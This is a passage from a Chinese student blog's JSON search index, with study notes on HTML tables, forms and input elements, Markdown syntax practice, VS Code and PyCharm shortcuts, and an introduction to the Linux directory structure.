&lt;/tr&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 1.3.1表格中的跨行跨列主要用来绘制复杂表格。 rowspan：跨行 colspan：跨列 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;表格中的跨行跨列&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--table[border=1 width=500 align=center&gt;tr*3&gt;td&#123;内容$&#125;*3--&gt; &lt;table border=&quot;1&quot; width=&quot;500&quot; align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;!--rowspan--&gt; &lt;/table&gt;&lt;table border=&quot;1&quot; width=&quot;500&quot; align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td rowspan=&quot;2&quot; align=&quot;center&quot; valign=&quot;middle&quot;&gt;内容1&lt;/td&gt; &lt;!--valign：用于垂直对齐调整&#123;top\\bottom\\middle&#125;--&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;!--单行居中--&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;!--&lt;td&gt;内容3&lt;/td&gt;--&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;table border=&quot;1&quot; width=&quot;500&quot; align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;!--colspan--&gt; &lt;table border=&quot;1&quot; width=&quot;500&quot; align=&quot;center&quot;&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=&quot;3&quot;&gt;内容1&lt;/td&gt; &lt;td&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 1.3.2绘制一张完整的表格 caption：标题 thead：表头 tbody：表体 tfoot：表尾 多处同时输入相同内容快捷键：Alt 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;完整表格&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--table[border=1 width=500 align=center]&gt;caption&#123;学生信息表&#125;+thead&gt;tr&gt;th*4--&gt; &lt;!--table[border=1 width=500 align=center]&gt;(caption&#123;学生信息表&#125;)+(thead&gt;tr&gt;th*4)+(tbody&gt;tr*3&gt;td*4)+(tfoot&gt;tr&gt;td[colspan=4])--&gt; &lt;table border=&quot;1&quot; width=&quot;500&quot; align=&quot;center&quot;&gt; &lt;caption&gt;学生信息表&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;学号&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;家庭住址&lt;/th&gt; &lt;th&gt;联系电话&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;李都*&lt;/td&gt; &lt;td&gt;XXXXXX&lt;/td&gt; &lt;td&gt;？&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;mike&lt;/td&gt; &lt;td&gt;XXXXXXX&lt;/td&gt; &lt;td&gt;?&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;Taylor*&lt;/td&gt; &lt;td&gt;XXXXX&lt;/td&gt; &lt;td&gt;?&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td colspan=&quot;4&quot;&gt;附注：*为优秀学生&lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 1.3.3 form表单标签form表单标签是所有标签最核心标签之一。用于实现前后端交互的重要组件。 常用属性： name：表单名称 action：表单数据提交位置，通常为后台文件名（.jsp/.php/.asp/.aspx/.py或网址等） 如果是#号，表示提交到当前文件下。 method：前端提交数据到后端的方法，主要有：get,post，默认为get. 表单元素有： input类 textarea类 button类 select类 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;form表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form name=&quot;StudentInformtion&quot; action=&quot;https://miketaylorjuly123.cn&quot; method=&quot;get&quot;&gt; &lt;!--get：明文传输--&gt; &lt;input type=&quot;submit&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userName&quot; placeholder=&quot;请输入您的姓名：&quot;&gt; &lt;/form&gt; &lt;!--隐式传输：用于密码传输等--&gt; &lt;form name=&quot;StudentInformtion&quot; action=&quot;https://miketaylorjuly123.cn&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userName&quot; placeholder=&quot;请输入您的姓名：&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 1.3.4 input标签input标签，根据不同的type属性，可以变化为多种状态输入方式。 主要用来输入、选择或者发出指令。 type值： password： text ：单行文本输入框，可以不写，因为默认text。 checkbox： file： button： image： submit： reset： radio: text常用属性： placeholder：提示文本 name：命名，便于传输，区别不同的文本传输 minlength：最少输入的字符个数 maxlegth：最多输入的字符个数 disabled：disabled=”disabled”，默认值disabled，不能选中，不能修改。 readonly：readonly=””readonly，默认值readonly，只读。 value：默认值 pattern：正则匹配 password常用属性： 与text一样 radio（单选钮）常用属性： name：必须要有 value: checked：默认选中某个按钮，只能有一个起作用 readonly disabled 注释：添加label标签提示按钮作用或备注。 checkbox（复选框）常用属性： 可用于选择0/1/多项。 name：必须要有 value: checked：默认选中某个按钮，可以多个起作用 readonly disabled file（文件上传按钮） button（普通按钮）常用属性： 通常用来调用脚本代码。 value: 按钮标题 disabled image（图片按钮）： 用法与botton相同。 特殊属性：src，用来加载提示图片，用它替换了value。 有提交功能，与submit按钮一样。 submit（提交按钮）： 用来将表单数据提交到后台。 reset（重置按钮）： 将表单所有组件输入的内容全部清空还原为初始状体 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;input标签&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--文本框--&gt;&lt;form action=&quot;#&quot; method=&quot;get&quot; name=&quot;测试&quot;&gt; &lt;input type=&quot;text&quot;&gt; &lt;br/&gt; &lt;input type=&quot;text&quot; name=&quot;text&quot; placeholder=&quot;请输入一个数字&quot; value=&quot;100&quot; disabled=&quot;disabled&quot;&gt; &lt;br/&gt; &lt;input type=&quot;text&quot; name=&quot;text&quot; placeholder=&quot;请输入一个数字&quot; value=&quot;100&quot; maxlength=&quot;6&quot; minlength=&quot;3&quot;&gt;&lt;/form&gt;&lt;!--密码框--&gt;&lt;form action=&quot;#&quot;&gt; &lt;br/&gt;&lt;input type=&quot;password&quot;&gt;&lt;br/&gt;&lt;/form&gt;&lt;!--单选按钮--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;radio&quot; name=&quot;性别&quot;&gt;男 &lt;input type=&quot;radio&quot; name=&quot;性别&quot; checked&gt;女 &lt;!--若要相排斥，name需统一--&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt; &lt;input type=&quot;radio&quot; name=&quot;选择题&quot;&gt;A &lt;input type=&quot;radio&quot; name=&quot;选择题&quot;&gt;B &lt;input type=&quot;radio&quot; name=&quot;选择题&quot;&gt;C &lt;input type=&quot;radio&quot; name=&quot;选择题&quot; checked&gt;D &lt;p&gt;&lt;/p&gt; &lt;p&gt;&lt;/p&gt;&lt;/form&gt;&lt;!--复选框--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot;&gt;篮球 &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot;&gt;音乐 &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot;&gt;代码 &lt;input type=&quot;checkbox&quot; name=&quot;hobby&quot;&gt;洗澡 &lt;input type=&quot;reset&quot; value=&quot;取消&quot;&gt;&lt;/form&gt;&lt;!--file：文件上传按钮--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;file&quot;&gt;&lt;/form&gt;&lt;br/&gt;&lt;br/&gt;&lt;!--button:普通按钮--&gt;&lt;form action=&quot;#&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;登录&quot;&gt;&lt;/form&gt;&lt;br/&gt;&lt;br/&gt;&lt;!--image（图片按钮）--&gt;&lt;form action=&quot;&quot;&gt; &lt;input type=&quot;image&quot; src=&quot;图片/3.bmp&quot; title=&quot;刷新&quot;&gt;&lt;/form&gt;&lt;br/&gt;&lt;br/&gt;&lt;!--提交按钮--&gt;&lt;form action=&quot;demo.asp&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;!--重置按钮--&gt;&lt;form action=&quot;&quot;&gt; &lt;input type=&quot;reset&quot; value=&quot;取消&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 1.3.5 textarea（文本域）标签也叫多行文本框，主要用来输入大批量的内容，可以输入回车。 常用属性： name id rows/cols：行数/列数 placeholder readonly disabled mixlength maxlength required：表示必须输入 1.3.6 select（下拉列表框）标签默认用于单项选择（节省空间），用option呈现每一个选项。 属性： multiple：选择可以实现多选 size：显示最多选项数量 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;textarea&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--textarea--&gt; &lt;form action=&quot;&quot;&gt; &lt;textarea name=&quot;memo&quot; id=&quot;memo&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;备注：&lt;/textarea&gt; &lt;/form&gt; &lt;p&gt;&lt;/p&gt; &lt;p&gt;&lt;/p&gt; &lt;!--select--&gt; &lt;form action=&quot;&quot;&gt; &lt;label for=&quot;sex&quot;&gt;性别：&lt;/label&gt; &lt;select name=&quot;&quot; id=&quot;sex&quot;&gt; &lt;option value=&quot;male&quot;&gt;男&lt;/option&gt; &lt;option value=&quot;female&quot;&gt;女&lt;/option&gt; &lt;option value=&quot;female&quot;&gt;d&lt;/option&gt; &lt;/select&gt; &lt;/form&gt; &lt;br/&gt; &lt;form action=&quot;&quot;&gt; &lt;label for=&quot;course&quot;&gt;选课：&lt;/label&gt; &lt;select name=&quot;&quot; id=&quot;course&quot; multiple size=&quot;1&quot;&gt; &lt;option value=&quot;chinese&quot;&gt;语文&lt;/option&gt; &lt;option value=&quot;math&quot;&gt;数学&lt;/option&gt; &lt;option value=&quot;computer science&quot;&gt;计算机&lt;/option&gt; &lt;/select&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 1.3.7 button标签普通按钮，具有提交功能。可以单独使用，不写在form元素中，如果写在form内有提交功能 1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;button&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--单独使用--&gt; &lt;button id=&quot;butok&quot;&gt;确认&lt;/button&gt;&lt;!--调用js代码--&gt; &lt;!--在form中使用--&gt; &lt;form action=&quot;test.html&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;info&quot;&gt; &lt;button&gt;提交&lt;/button&gt; &lt;!--这里的button的功能与input中的submit按钮功能一样，--&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 表单通用属性：name value readonly disabled 1.4 iframe框架标签&lt;iframe&gt;元素会创建包含另外一个包含一个文档的内联框架，也是镶嵌在一个网页中的另一个网页。相当于网页中嵌套了一个窗口。 iframe框架集：用来将多个网页文件组合成一个文件。 iframe标签属性： src：规定在框架内显示文档的URL/引入外部html文件 name：规定框架名称 width：iframe设置高度（百分比或者px） height：iframe：设置宽度 frameborder：设置框架边框（1/0） scrolling：设置滚动条（yes/no/auto） marginheight：框架离顶部和底部的距离（%/px） marginwidth：框架离左边和右边的距离（%/px） 注意：在实际开发中，尽量减少使用iframe，因为它破坏网站的前进和后退功能，且不利于SEO（抓取关键字）。 1.5 第二次作业123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;第二次作业&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--TABLE ONE--&gt; &lt;table border=&quot;1&quot; style=&quot;color: lightskyblue;width:300px;height: 150px;border-color:deepskyblue&quot;&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;!--TABLE TWO--&gt; &lt;table style=&quot;border-color: #87faf8;width:100%&quot; border=&quot;1&quot; cellspacing=&quot;1&quot; cellpadding=&quot;20&quot;&gt; &lt;tr style=&quot;width:100%;height:200px&quot; align=&quot;center&quot;&gt; &lt;td colspan=&quot;3&quot;&gt;&lt;strong&gt;网站名称&lt;/strong&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr style=&quot;width:100%;height:40px&quot;&gt; &lt;td&gt;网站标题&lt;/td&gt; &lt;td colspan=&quot;2&quot; align=&quot;right&quot;&gt;搜索框&lt;/td&gt; &lt;/tr&gt; &lt;tr style=&quot;width:100%;height:150px&quot;&gt; &lt;td align=&quot;left&quot;&gt;左边&lt;/td&gt; &lt;td align=&quot;left&quot;&gt;右边&lt;/td&gt; &lt;td align=&quot;left&quot;&gt;中间&lt;/td&gt; &lt;/tr&gt; &lt;tr style=&quot;width:100%;height:150px&quot; align=&quot;center&quot;&gt; &lt;td colspan=&quot;3&quot;&gt;&lt;strong&gt;网站底部信息&lt;/strong&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;!--TABLE THREE--&gt; &lt;table border=&quot;5&quot; style=&quot;width:700px;height:400px;border-color: hotpink&quot;&gt; &lt;caption&gt;&lt;strong&gt;完整表格练习题&lt;/strong&gt; &lt;tr&gt; &lt;td rowspan=&quot;8&quot; width=&quot;150px&quot;&gt;&lt;img src=&quot;https://smartdl.lenovo.com.cn/frontend/browser/hao.edge/image/af4616c312d.png&quot; width=&quot;100px&quot; alt=&quot;练习&quot;&gt;&lt;/td&gt; &lt;td rowspan=&quot;4&quot; align=&quot;center&quot;&gt;11&lt;/td&gt; &lt;td rowspan=&quot;2&quot; align=&quot;center&quot;&gt;12&lt;/td&gt; &lt;td align=&quot;center&quot;&gt;13&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;13&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td rowspan=&quot;2&quot;&gt;12&lt;/td&gt; &lt;td&gt;13&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;13&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td rowspan=&quot;4&quot;&gt;11&lt;/td&gt; &lt;td rowspan=&quot;2&quot;&gt;12&lt;/td&gt; &lt;td&gt;13&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;13&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td rowspan=&quot;2&quot;&gt;12&lt;/td&gt; &lt;td&gt;13&lt;/td&gt; &lt;/tr&gt; &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;13&lt;/td&gt; &lt;/tr&gt; &lt;/caption&gt; &lt;/table&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;!--表单--&gt; &lt;h1&gt;表单信息&lt;/h1&gt; &lt;form action=&quot;&quot; method=&quot;get&quot; name=&quot;个人信息&quot;&gt; &lt;label for=&quot;1&quot;&gt;账号：&lt;/label&gt;&lt;input type=&quot;text&quot; placeholder=&quot;请输入账号：&quot; id=&quot;1&quot;&gt;&lt;br/&gt; 邮箱：&lt;input type=&quot;email&quot; placeholder=&quot;请输入邮箱：&quot;&gt;&lt;br/&gt; 密码：&lt;input type=&quot;password&quot; placeholder=&quot;请输入密码：&quot; minlength=&quot;6&quot;&gt;&lt;br/&gt; 性别：&lt;input type=&quot;radio&quot; name=&quot;性别&quot; checked&gt;男 &lt;input type=&quot;radio&quot; name=&quot;性别&quot;&gt;女 &lt;br/&gt; 技能：&lt;input type=&quot;checkbox&quot; name=&quot;技能&quot;&gt;html+css &lt;input type=&quot;checkbox&quot; name=&quot;技能&quot;&gt;java &lt;input type=&quot;checkbox&quot; name=&quot;技能&quot;&gt;php &lt;input type=&quot;checkbox&quot; name=&quot;技能&quot;&gt;javascript &lt;br/&gt; 头像：&lt;input type=&quot;file&quot;&gt;&lt;br/&gt; 现居地：&lt;select name=&quot;&quot; id=&quot;省份&quot;&gt; &lt;option value=&quot;四川&quot;&gt;四川&lt;/option&gt; &lt;option value=&quot;广东&quot;&gt;广东&lt;/option&gt; &lt;option value=&quot;江苏&quot;&gt;江苏&lt;/option&gt; &lt;/select&gt; &lt;select name=&quot;&quot; id=&quot;市&quot;&gt; &lt;option value=&quot;四川&quot;&gt;成都市&lt;/option&gt; &lt;option value=&quot;广东&quot;&gt;广州市&lt;/option&gt; &lt;option value=&quot;江苏&quot;&gt;张家港市&lt;/option&gt; &lt;/select&gt; &lt;select name=&quot;&quot; id=&quot;县/区&quot;&gt; &lt;option value=&quot;四川&quot;&gt;三台县&lt;/option&gt; &lt;option value=&quot;广东&quot;&gt;天河区&lt;/option&gt; &lt;option value=&quot;江苏&quot;&gt;保税区&lt;/option&gt; &lt;/select&gt;&lt;br/&gt;留言： &lt;br/&gt;&lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot; placeholder=&quot;请输入留言内容&quot;&gt;&lt;/textarea&gt; &lt;br/&gt; 验证码：&lt;input type=&quot;text&quot; placeholder=&quot;请输入验证码&quot;&gt; &lt;input type=&quot;image&quot; src=&quot;https://smartdl.lenovo.com.cn/frontend/browser/hao.edge/image/af4616c312d.png&quot; width=&quot;75px&quot; title=&quot;验证码&quot;&gt; &lt;br/&gt; &lt;input type=&quot;submit&quot;&gt; &lt;input type=&quot;reset&quot;&gt; &lt;/form&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt;&lt;/body&gt;&lt;/html&gt; 第二章 CSS基础","categories":[],"tags":[{"name":"HTML","slug":"HTML","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/HTML/"}]},{"title":"MarkDown","slug":"MK语法学习","date":"2021-03-04T11:48:46.000Z","updated":"2021-08-26T07:29:46.021Z","comments":true,"path":"2021/03/04/MK语法学习/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/04/MK%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"第一章 起步 1.1 搭建编程环境1.1.1 Python版本每种语言 有些老书 便于学习 千金散尽还复来 终端窗口 嘉宾是非常可爱的^歌手。 比如PHP1 Markdown Extra [2] 是这样的。 第一项 第一项的第一个嵌套元素 第一项的第二个嵌套元素 第二项 第三项 1.第一项2.第二项3.第三项 区块引用浅尝辄止卧薪尝胆 叶公好龙 火烧联营 潜移默化 区块使用列表1.第一项2.第二项 第一项 第二项 第三项 列表中使用区块 第一项后来airplanes 第二项 code 方法一printf()`函数(注意是反引号，shift加~) 方法二 &lt;?javascript echo &#39;RUNOOB&#39;; function test() &#123; echo &#39;test&#39;; &#125; ​ 方法三 123$(document).ready(function () &#123; alert(&#x27;RUNOOB&#x27;);&#125;); 链接设置 初级我的博客我的博客https://miketaylorjuly123.cn 高级我的博客 图片 *第一种 第二种 第三种 [图片链接][https://s3.ax1x.com/2021/03/01/6PK2lV.gif] Markdown表格 姓名 寝室 张JL 307 张L 307 朱J 未知 NYM 未知 黄CK 301 Makedown高级技巧 *使用ctrl+Alt+Del 转义 *文字加粗**如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符 公式$$\\mathbf{V}_1 \\times \\mathbf{V}_2 = \\begin{vmatrix}\\mathbf{i} &amp; \\mathbf{j} &amp; \\mathbf{k} \\\\frac{\\partial X}{\\partial u} &amp; \\frac{\\partial Y}{\\partial u} &amp; 0 \\\\frac{\\partial X}{\\partial v} &amp; \\frac{\\partial Y}{\\partial v} &amp; 0 \\\\end{vmatrix}${$tep1}{\\style{visibility:hidden}{(x+1)(x+1)}}$$ typora流程图、时序图（顺序图）、甘特图 graph LR A[方形] --&gt;B(圆角) B --&gt; C&#123;条件a&#125; C --&gt;|a&#x3D;1| D[结果1] C --&gt;|a&#x3D;2| E[结果2] F[横向流程图] 1.1.2 运行Python代码片段1.1.3 Sublime Text简介 1.2 在不同的操作系统中搭建Python编程1.2.1 在windows系统搭建Python编程环境1.2.2 在MacOS系统搭建Python编程环境1.2.3 在Linux系统搭建Python编程环境 1.3 运行Hello World程序1.3.1 配置Sublime Text以使用正确的Pyton版本1.3.2 运行hello_world.py 1.4 解决安装问题 1.5 在终端运行Python程序1.5.1 在windows系统中从终端运行Python程序1.5.2 在Linux和macOS系统中从终端运行Python程序 1.6 小结—脚注1 ↩脚注2 ↩","categories":[],"tags":[{"name":"markdown","slug":"markdown","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/markdown/"}]},{"title":"VSCode","slug":"编辑器","date":"2021-03-04T11:48:46.000Z","updated":"2021-11-22T07:45:33.553Z","comments":true,"path":"2021/03/04/编辑器/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/04/%E7%BC%96%E8%BE%91%E5%99%A8/","excerpt":"","text":"编辑器Vs Code快捷键 快捷键 功能 Ctrl + K + Z 无干扰模式 Ctrl + Shift + P，F1 显示命令面板 Ctrl + Shift + N 新窗口/实例 Alt+ ↑ / ↓ 向上/向下复制行 Ctrl+Enter 在下面插入行 Ctrl+Shift+Enter 在上面插入行 Ctrl+↑ / ↓ 向上/向下滚动行 Shift+Alt+A 切换块注释 Alt + Left/Right 切换文件 Ctrl+Alt+↑ / ↓ 键盘上向上或者向下键，使一列上出现多个光标 F8 转到下一个错误或警告 Ctrl + H 替换 Replace Ctrl + D 将选择添加到下一个查找匹配 Shift + Alt + I 在选定的每一行的末尾插入光标 Ctrl + L 选中行 Ctrl + F2 选择当前字的所有出现 Ctrl + 空格 触发建议 F12 转到定义 F2 重命名符号 Ctrl+K R 显示资源管理器中的活动文件 Ctrl+K P 复制活动文件的路径 F11 切换全屏 Ctrl+ = / - 放大/缩小 Ctrl+B 切换侧栏可见性 Ctrl+Shift+G 显示Git Ctrl+Shift+D 显示调试 Ctrl+Shift+X 显示扩展 Ctrl+Shift+C 打开新命令提示符/终端 Ctrl+` 显示集成终端 Crtl + J 显示/隐藏集成终端 Alt + Shift + F 代码格式化 Pycharm快捷键 快捷键 作用 Ctrl + Alt + L 代码格式化 Alt + B 默认浏览器打开HTML文件","categories":[],"tags":[{"name":"编辑器","slug":"编辑器","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E7%BC%96%E8%BE%91%E5%99%A8/"}]},{"title":"Linux入门","slug":"linux入门","date":"2021-03-04T04:08:49.000Z","updated":"2021-05-28T09:20:13.764Z","comments":true,"path":"2021/03/04/linux入门/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/04/linux%E5%85%A5%E9%97%A8/","excerpt":"","text":"Linux简介1.Linux简介：操作系统、安装在计算机硬件上、用来管理计算机的硬件和软件资源的系统软件。它是一种开源的、免费的操作系统，注重系统安全性、稳定性，卡顿相比windows来说低，高并发处理能力好，但没有优异的可视化操作界面。windows用于个人电脑，Linux用于企业服务器上。 2.Linux发行版本：1991年Linus开发Linux内核程序，后来很多软件开发组织以及软件公司在内核程序基础上，陆续推出了很多不同版本的Linux操作系统：Ubuntu、RedHat、CentOS 3、安装Linux操作系统： 1）虚拟机：可以软件模拟出一套具有完整硬件系统的、运行在一个完全隔离环境中的完整计算机系统。 2）安装Linux：Linux镜像，可视化界面单薄，使用Linux多数基于终端命令行，来使用Linux指令操作计算机。 4、Linux的目录结构 1）Linux只有一个根目录。/ 2）层级式目录结构： /root：该目录为系统管理员目录，root是具有超级权限的用户。 root/Desktop root/Maildir /bin（bin-&gt;usr/bin）：存放系统预装的可执行文件，这里存放的可执行文件可以在系统的任何目录下执行。 /boot：这个目录存放Linux启动时使用的一些核心文件，包括一些连接文件和镜像文件。 /dev：是设备（device）的缩写，该目录下存放的是Linux的外部设备，Linux中的设备也是以文件形式存在。 /etc：存放所有的系统管理所需要的配置文件。 /home：用户的主目录，在Linux中，每个用户都拥有一个自己的目录，一般该目录名以用户的账号命名，叫做用户的根目录，用户登录以后，默认打开自己的根目录。 /var /liblib-&gt;usr/lib）：存放系统最基本的动态连接共享库，作用类似于windows中的DLL文件，几乎所有的应用程序都需要用到这个共享库。 /usr：Linux系统资源目录，里面存放的是一些系统可执行文件或系统以来的一些文件库。 /usr/bin /usr/lib /usr/local/bin：存放用户自己的可执行文件，同样，这里存放的可执行文件，可以在系统的任何目录下 /media","categories":[],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]}],"categories":[],"tags":[{"name":"考试","slug":"考试","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E8%80%83%E8%AF%95/"},{"name":"pytorch","slug":"pytorch","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/pytorch/"},{"name":"Deep Learning","slug":"Deep-Learning","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Deep-Learning/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JavaScript/"},{"name":"视频监控","slug":"视频监控","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7/"},{"name":"Vue","slug":"Vue","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Vue/"},{"name":"SDC","slug":"SDC","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/SDC/"},{"name":"Spring","slug":"Spring","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Spring/"},{"name":"markdown","slug":"markdown","permalink":"https://github.com/zhangj